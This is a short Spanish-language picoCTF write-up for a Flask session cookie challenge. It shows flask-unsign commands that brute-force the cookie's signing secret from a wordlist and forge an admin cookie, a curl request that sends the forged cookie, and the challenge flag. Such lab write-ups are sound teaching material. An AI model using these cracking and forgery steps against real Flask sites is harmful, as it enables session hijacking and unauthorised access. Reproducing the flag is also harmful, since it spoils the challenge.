
### Descripción 
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)
### Solución
Para realizar el reto, primero revisamos el script de python del cual sacamos de un arreglo una serie de palabras,  las cuales guardamos en un nuevo archivo. Luego realizamos los siguientes comandos 
	
		flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aAQTPA.rrMoXxomM0zu7hUhITRvP2NPHaM" --wordlist cookies.txt

Obtenemos la palabra secreta

	flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret "peanut butter"

	curl -s http://mercury.picoctf.net:53700/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aAQVRg.UbaZu8ryRxKFmsRBcWGDCBo8nJQ" | grep pico


Solución: **picoCTF{pwn_4ll_th3_cook1E5_3646b931}**
### Notas adicionales


### Referencias 
https://www.youtube.com/watch?v=ufs1xqSQCUM&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=66